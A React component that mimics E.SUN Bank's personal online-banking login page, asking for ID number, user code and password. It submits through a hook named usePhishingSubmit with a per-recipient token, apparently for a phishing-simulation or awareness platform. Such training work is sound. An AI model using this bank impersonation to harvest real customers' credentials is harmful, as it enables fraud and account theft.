"use client";

import { usePhishingSubmit } from "./usePhishingSubmit";

export default function EsunBankLogin({ token }: { token: string }) {
  const { loading, handleSubmit } = usePhishingSubmit(token);

  return (
    <div className="min-h-screen bg-[#f5f5f5]">
      {/* Top bar */}
      <div className="bg-white border-b border-[#e0e0e0] shadow-sm">
        <div className="max-w-[1200px] mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded-full bg-[#00695c] flex items-center justify-center">
              <span className="text-white text-xs font-bold">E.</span>
            </div>
            <span className="text-[#00695c] font-bold text-lg">玉山銀行</span>
            <span className="text-[#00695c] text-xs ml-1">E.SUN BANK</span>
            <span className="text-[#666] text-sm ml-4">個人網路銀行</span>
          </div>
          <div className="text-sm text-[#666]">
            <a href="#" className="text-[#00695c] hover:underline">玉山銀行首頁</a>
          </div>
        </div>
      </div>

      {/* Main content */}
      <div className="max-w-[1200px] mx-auto px-4 py-8 flex flex-col lg:flex-row gap-8">
        {/* Left side - login form */}
        <div className="lg:w-[400px]">
          <div className="bg-white rounded-lg shadow-sm border border-[#e0e0e0] overflow-hidden">
            {/* Tabs */}
            <div className="flex border-b border-[#e0e0e0]">
              <div className="flex-1 py-3 text-center text-sm font-medium text-white bg-[#00695c] cursor-pointer">
                一般登入
              </div>
              <div className="flex-1 py-3 text-center text-sm font-medium text-[#666] bg-[#f9f9f9] cursor-pointer hover:bg-[#f0f0f0]">
                QRCode 登入
              </div>
              <div className="flex-1 py-3 text-center text-sm font-medium text-[#666] bg-[#f9f9f9] cursor-pointer hover:bg-[#f0f0f0]">
                玉山金融卡
              </div>
            </div>

            <div className="p-6">
              <p className="text-sm text-[#333] mb-1 font-medium">使用者登入</p>
              <form onSubmit={handleSubmit} className="space-y-4 mt-4">
                <div>
                  <label className="block text-sm text-[#555] mb-1">身分證字號</label>
                  <input
                    type="text"
                    placeholder="請輸入身分證字號"
                    className="w-full px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#00695c]"
                    autoComplete="off"
                  />
                </div>
                <div>
                  <label className="block text-sm text-[#555] mb-1">使用者代號</label>
                  <input
                    type="text"
                    placeholder="請輸入使用者代號"
                    className="w-full px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#00695c]"
                    autoComplete="off"
                  />
                </div>
                <div>
                  <label className="block text-sm text-[#555] mb-1">網銀密碼</label>
                  <input
                    type="password"
                    placeholder="請輸入網銀密碼"
                    className="w-full px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#00695c]"
                    autoComplete="off"
                  />
                </div>

                <div className="flex items-center gap-2 text-xs text-[#666]">
                  <input type="checkbox" id="esun-agree" />
                  <label htmlFor="esun-agree">
                    已詳閱使用者條款/隱私權
                  </label>
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-[#00695c] text-white py-2.5 rounded text-sm font-medium hover:bg-[#00534a] transition-colors disabled:opacity-50"
                >
                  {loading ? "登入中..." : "登入"}
                </button>
              </form>
            </div>
          </div>
        </div>

        {/* Right side - banner placeholder */}
        <div className="flex-1 hidden lg:block">
          <div className="bg-white rounded-lg shadow-sm border border-[#e0e0e0] p-8 text-center">
            <div className="text-[#00695c] text-xl font-bold mb-4">安全提醒</div>
            <p className="text-[#666] text-sm leading-relaxed">
              玉山銀行不會以電子郵件或簡訊要求您提供帳號密碼。<br />
              請確認網址列為 https://ebank.esunbank.com.tw
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="border-t border-[#e0e0e0] mt-8 py-4 text-center text-xs text-[#999]">
        <p>&copy; 玉山商業銀行 版權所有</p>
      </div>
    </div>
  );
}
